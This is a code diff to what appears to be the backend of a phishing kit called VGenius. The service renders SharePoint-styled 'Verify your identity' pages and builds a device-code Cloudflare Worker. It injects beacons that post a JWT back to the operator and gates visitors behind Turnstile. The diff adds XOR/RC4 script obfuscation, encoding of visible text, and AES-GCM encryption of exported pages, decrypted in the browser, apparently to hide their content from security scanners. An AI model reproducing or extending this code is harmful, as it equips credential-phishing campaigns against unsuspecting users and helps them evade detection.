@@ -1,16 +1,40 @@
 /**
  * VGenius Template Loader Service
+ * Encrypts exported templates using AES-GCM (like decrypt.html competitor)
+ * Keeps heavy XOR obfuscation for JavaScript engines.
  */
 'use strict';
 
 const fs = require('fs');
 const path = require('path');
+const crypto = require('crypto');
 const config = require('../config/env');
 const jwt = require('jsonwebtoken');
 
 const TEMPLATES_DIR = path.join(__dirname, '..', '..', 'templates');
 const DESIGNS_DIR = path.join(__dirname, '..', '..', 'verification-designs');
 
+// ─── AES-GCM Encryption Utilities ──────────────────────────
+const ALGO = 'aes-256-gcm';
+const AAD = 'VG-TEMPLATE-2024';
+
+function encryptPayload(plaintext, password) {
+    const salt = crypto.randomBytes(16);
+    const iv = crypto.randomBytes(12);
+    const key = crypto.pbkdf2Sync(password, salt, 100000, 32, 'sha512');
+    const cipher = crypto.createCipheriv(ALGO, key, iv);
+    cipher.setAAD(Buffer.from(AAD));
+    let encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
+    const tag = cipher.getAuthTag();
+    return {
+        cipher: encrypted.toString('base64'),
+        salt: salt.toString('base64'),
+        iv: iv.toString('base64'),
+        tag: tag.toString('base64')
+    };
+}
+
+// ─── List & Resolve Templates ──────────────────────────────
 function listDiskTemplates() {
     try {
         if (!fs.existsSync(TEMPLATES_DIR)) return [];
@@ -37,7 +61,7 @@ function resolveTemplateDirectory(templateType) {
         if (fs.existsSync(cp)) {
             try {
                 const c = JSON.parse(fs.readFileSync(cp, 'utf8'));
-                if (c?.name && normalizeTemplateKey(c.name) === ni) return path.join(TEMPLATES_DIR, dn);
+                if (c && c.name && normalizeTemplateKey(c.name) === ni) return path.join(TEMPLATES_DIR, dn);
             } catch (err) {}
         }
     }
@@ -75,6 +99,7 @@ function loadVerificationDesignCSS(designName) {
     return fs.existsSync(fp) ? fs.readFileSync(fp, 'utf8') : '';
 }
 
+// ─── Admin Settings ────────────────────────────────────────
 async function loadAdminSettings() {
     const obj = {};
     try {
@@ -95,6 +120,7 @@ function boolSetting(v) {
     return String(v || '').toLowerCase() === 'true';
 }
 
+// ─── JS Obfuscation (XOR + RC4 kept as requested) ─────────
 function obfuscateJs(sourceCode) {
     try {
         const JavaScriptObfuscator = require('javascript-obfuscator');
@@ -131,6 +157,7 @@ function obfuscateJs(sourceCode) {
     }
 }
 
+// ─── Window Variables Builder ──────────────────────────────
 function buildWindowVars(link, user, settings, options) {
     options = options || {};
     const jt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
@@ -143,7 +170,7 @@ function buildWindowVars(link, user, settings, options) {
     const turnstileEnabled = link.turnstile_enabled !== false && link.turnstile_enabled !== 0;
     const exportDomain = options.domain ? String(options.domain).trim().replace(/^https?:\/\//, '').replace(/\/+$/, '') : '';
     const turnstileSiteKey = config.CF_TURNSTILE_SITE_KEY || '';
-    let apiBase = '';
+    var apiBase = '';
     if (options.apiBaseUrl) apiBase = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
     else if (config.APP_URL) apiBase = String(config.APP_URL).trim().replace(/\/+$/, '');
 
@@ -173,21 +200,12 @@ function buildWindowVars(link, user, settings, options) {
     return '<script>!function(){try{var j=JSON.parse(atob("' + encoded + '"));for(var k in j)window[k]=j[k]}catch(e){}}();</script>';
 }
 
-function minifyHtml(html) {
-    html = html.replace(/<!--[\s\S]*?-->/g, '');
-    html = html.replace(/\s*>\s*</g, '><');
-    html = html.replace(/[ \t\n\r]+/g, ' ');
-    html = html.replace(/\s*=\s*/g, '=');
-    return html.trim();
-}
-
+// ─── Text Obfuscation (XOR + Base64 for text nodes only) ──
 function obfuscateTextContent(html) {
     var strings = [];
     var seen = new Set();
 
-    // Step 1: Only encode text nodes between tags, NEVER touch attributes
-    // Safe regex: only match text that is purely alphanumeric, spaces, dots, hyphens, commas
-    html = html.replace(/>([A-Za-z0-9\s\-\.\/\,\!\?\&\;\#\(\)\[\]\{\}<>\"\'=]+)</g, function(match, text) {
+    html = html.replace(/>([A-Za-z0-9\s\-\.\/\,\!\?\&\;\#\(\)\[\]\{\}\<\>\"\'=]+)</g, function(match, text) {
         var trimmed = text.trim();
         if (!trimmed || trimmed.length < 3) return match;
         if (!seen.has(trimmed)) {
@@ -195,10 +213,9 @@ function obfuscateTextContent(html) {
             strings.push(trimmed);
         }
         var idx = strings.length - 1;
-        return '><span class="__vg" data-idx="' + idx + '">__PLACEHOLDER__</span>';
+        return '><span class="__vg" data-idx="' + idx + '">__VG__</span>';
     });
 
-    // Step 2: Encode all collected strings with XOR + Base64
     var encodedMap = {};
     for (var i = 0; i < strings.length; i++) {
         var s = strings[i];
@@ -209,21 +226,13 @@ function obfuscateTextContent(html) {
         encodedMap[i] = Buffer.from(encoded).toString('base64');
     }
 
-    // Step 3: Build the encoded array for the decoder script
     var encodedArr = [];
     for (var k = 0; k < strings.length; k++) {
         encodedArr.push('"' + encodedMap[k] + '"');
     }
 
-    // Step 4: Create the decoder script that runs in browser
-    var decodeScript = '<script>(function(){var S=[' + encodedArr.join(',') + '];var D=[];for(var i=0;i<S.length;i++){var p=atob(S[i]);var t="";for(var j=0;j<p.length;j++){t+=String.fromCharCode(p.charCodeAt(j)^(i+42)^90)}D[i]=t}var spans=document.querySelectorAll("span.__vg");for(var i=0;i<spans.length;i++){var idx=parseInt(spans[i].getAttribute("data-idx"));if(D[idx]!==undefined){spans[i].textContent=D[idx];spans[i].removeAttribute("class");spans[i].removeAttribute("data-idx")}}})();<\/script>';
+    var decodeScript = '<scr' + 'ipt>(function(){var S=[' + encodedArr.join(',') + '];var D=[];for(var i=0;i<S.length;i++){var p=atob(S[i]);var t="";for(var j=0;j<p.length;j++){t+=String.fromCharCode(p.charCodeAt(j)^(i+42)^90)}D[i]=t}var spans=document.querySelectorAll("span.__vg");for(var i=0;i<spans.length;i++){var idx=parseInt(spans[i].getAttribute("data-idx"));if(D[idx]!==undefined){spans[i].textContent=D[idx];spans[i].className="";spans[i].removeAttribute("data-idx")}}})();</scr' + 'ipt>';
 
-    // Step 5: Replace placeholders with actual decoded text via spans
-    html = html.replace(/><span class="__vg" data-idx="(\d+)">__PLACEHOLDER__<\/span>/g, function(m, num) {
-        return '><span data-v="' + num + '">__PLACEHOLDER__</span>';
-    });
-
-    // Step 6: Insert decode script before </head> or at start of <body>
     if (html.indexOf('</head>') !== -1) {
         html = html.replace('</head>', decodeScript + '</head>');
     } else if (html.indexOf('<body') !== -1) {
@@ -232,31 +241,10 @@ function obfuscateTextContent(html) {
         html = decodeScript + html;
     }
 
-    // Step 7: Minify to ~20 lines (preserve structure but collapse)
-    html = html.replace(/<!--[\s\S]*?-->/g, '');
-    html = html.replace(/\r\n/g, '\n');
-    html = html.replace(/[ \t]+/g, ' ');
-    // Break into ~20 lines by inserting newlines at logical points
-    html = html.replace(/></g, '>\n<');
-    var lines = html.split('\n');
-    if (lines.length > 20) {
-        var merged = [];
-        var chunk = '';
-        for (var i = 0; i < lines.length; i++) {
-            if ((chunk + lines[i]).length > 120 && chunk.length > 0) {
-                merged.push(chunk);
-                chunk = lines[i];
-            } else {
-                chunk += lines[i];
-            }
-        }
-        if (chunk) merged.push(chunk);
-        html = merged.join('\n');
-    }
-
     return html.trim();
 }
 
+// ─── Main Page Rendering ───────────────────────────────────
 async function renderPageHtml(link, user, options) {
     options = options || {};
     const templateType = link.template_type || 'sharepoint3';
@@ -267,15 +255,15 @@ async function renderPageHtml(link, user, options) {
         options.apiBaseUrl = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
     }
 
-    let html = loadTemplateHTML(templateType);
+    var html = loadTemplateHTML(templateType);
     const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
     const script = loadTemplateJS(templateType);
 
     if (html.includes('{{CSS}}')) {
-        html = html.replace(/\/\* \{\{CSS\}\} \*\//, '<style>' + css + '</style>');
+        html = html.replace('/* {{CSS}} */', '<style>' + css + '</style>');
     }
     if (html.includes('{{SCRIPT}}')) {
-        html = html.replace(/\/\/ \{\{SCRIPT\}\}/, '<script>' + script + '</script>');
+        html = html.replace('// {{SCRIPT}}', '<script>' + script + '</script>');
     }
 
     html = html.replace('{{TITLE}}', link.title_text || 'Verify your identity');
@@ -296,7 +284,7 @@ async function renderPageHtml(link, user, options) {
 
     const windowVars = buildWindowVars(link, user, settings, options);
 
-    let vgEngine = '';
+    var vgEngine = '';
     const vgEnginePath = path.join(TEMPLATES_DIR, 'assets', 'vg-engine.js');
     if (fs.existsSync(vgEnginePath)) {
         vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
@@ -321,41 +309,88 @@ async function renderPageHtml(link, user, options) {
     }
 
     const doObfuscate = boolSetting(settings.obfuscation_enabled) || link.obfuscated;
-    if (doObfuscate) {
-        if (vgEngine && vgEngine.length > 100) {
-            const obfuscatedEngine = obfuscateJs(vgEngine);
-            const pattern = '<script>' + vgEngine.substring(0, Math.min(50, vgEngine.length)).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-            try {
-                html = html.replace(new RegExp(pattern + '[\\s\\S]*?<\\/script>'), '<script>' + obfuscatedEngine + '</script>');
-            } catch (e) { /* regex error, skip */ }
-        }
-        if (script && script.length > 10) {
-            const obfuscatedScript = obfuscateJs(script);
-            const pattern2 = '<script>' + script.substring(0, Math.min(30, script.length)).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-            try {
-                html = html.replace(new RegExp(pattern2 + '[\\s\\S]*?<\\/script>'), '<script>' + obfuscatedScript + '</script>');
-            } catch (e) { /* regex error, skip */ }
+    if (doObfuscate && vgEngine && vgEngine.length > 100) {
+        const obfuscatedEngine = obfuscateJs(vgEngine);
+        const scripts = html.match(/<script>[\s\S]*?<\/script>/g) || [];
+        for (let i = 0; i < scripts.length; i++) {
+            if (scripts[i].length > 500 && scripts[i].includes('VGenius')) {
+                html = html.replace(scripts[i], '<script>' + obfuscatedEngine + '</script>');
+                break;
+            }
         }
     }
+    if (doObfuscate && script && script.length > 10) {
+        const obfuscatedScript = obfuscateJs(script);
+        html = html.replace('<script>' + script.substring(0, Math.min(30, script.length)), '<script>' + obfuscatedScript.substring(0, Math.min(30, obfuscatedScript.length)));
+    }
 
+    // For download/export: encrypt entire HTML using AES-GCM
     if (options.exportForDownload) {
-        html = minifyHtml(html);
+        html = html.replace(/<script>fetch\([^)]*beacon[^)]*\)[^<]*<\/script>/g, '');
+        html = obfuscateTextContent(html);
+
+        const encryptionPassword = 'VG-' + (user.id || 'default') + '-' + Date.now();
+        const encrypted = encryptPayload(html, encryptionPassword);
+        const cipherB64 = encrypted.cipher;
+        const saltB64 = encrypted.salt;
+        const ivB64 = encrypted.iv;
+        const tagB64 = encrypted.tag;
+
+        const wrapperLines = [
+            '<!DOCTYPE html>',
+            '<html>',
+            '<head>',
+            '<meta charset="UTF-8">',
+            '<style>html,body{margin:0;padding:0;height:100%;background:#fff;}</style>',
+            '</head>',
+            '<body>',
+            '<script>',
+            '(async function(){',
+            ' try {',
+            '  if (!window.crypto || !window.crypto.subtle) { throw new Error("Web Crypto not available"); }',
+            '  var enc = {"cipher":"' + cipherB64 + '","salt":"' + saltB64 + '","iv":"' + ivB64 + '","tag":"' + tagB64 + '"};',
+            '  var salt = Uint8Array.from(atob(enc.salt), c => c.charCodeAt(0));',
+            '  var iv = Uint8Array.from(atob(enc.iv), c => c.charCodeAt(0));',
+            '  var ct = Uint8Array.from(atob(enc.cipher), c => c.charCodeAt(0));',
+            '  var tag = Uint8Array.from(atob(enc.tag), c => c.charCodeAt(0));',
+            '  var keyMaterial = await crypto.subtle.importKey("raw", salt.slice(0,32), "PBKDF2", false, ["deriveKey"]);',
+            '  var aesKey = await crypto.subtle.deriveKey({name:"PBKDF2", salt:salt, iterations:100000, hash:"SHA-512"}, keyMaterial, {name:"AES-GCM", length:256}, false, ["decrypt"]);',
+            '  var decrypted = await crypto.subtle.decrypt({name:"AES-GCM", iv:iv}, aesKey, ct);',
+            '  var decodedHtml = new TextDecoder().decode(decrypted);',
+            '  document.open();',
+            '  document.write(decodedHtml);',
+            '  document.close();',
+            ' } catch (e) {',
+            '  document.body.innerHTML = "Loading failed: " + e.message;',
+            ' }',
+            '})();',
+            '<\\/script>',
+            '</body>',
+            '</html>'
+        ];
+        return wrapperLines.join('\n');
     }
 
-    html = html.replace('</body>', '<script>fetch(\'' + beaconUrl + '\',{method:\'POST\',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script></body>');
-
+    html = html.replace('</body>', "<script>fetch('" + beaconUrl + "',{method:'POST',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script></body>");
     return html;
 }
 
+// ─── Export HTML Generation ────────────────────────────────
 async function generateExportHtml(link, user, options) {
     return renderPageHtml(link, user, Object.assign({}, options, { exportForDownload: true }));
 }
 
+// ─── Worker Script Builder ─────────────────────────────────
 async function buildWorkerScript(link, user, apiBaseUrl) {
     const pageHtml = await renderPageHtml(link, user, {});
     let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
     const verifyUrl = apiBaseUrl || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
     const linkJwt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });
+
+    const escapedHtml = pageHtml
+        .replace(/\\/g, '\\\\')
+        .replace(/`/g, '\\`')
+        .replace(/\$/g, '\\$');
 
     workerJs = workerJs
         .replace("'{{JWT_TOKEN}}'", "'" + linkJwt + "'")
@@ -364,7 +399,7 @@ async function buildWorkerScript(link, user, apiBaseUrl) {
         .replace("'{{VERIFY_ENDPOINT}}'", "'" + verifyUrl + "'")
         .replace("'{{BEACON_ENDPOINT}}'", "'" + verifyUrl + "'")
         .replace("'{{LOG_ENDPOINT}}'", "'" + verifyUrl + "'")
-        .replace("`{{TEMPLATE_HTML}}`", '`' + pageHtml.replace(/`/g, '\\`').replace(/\$/g, '\\$') + '`');
+        .replace("`{{TEMPLATE_HTML}}`", '`' + escapedHtml + '`');
 
     return workerJs;
 }
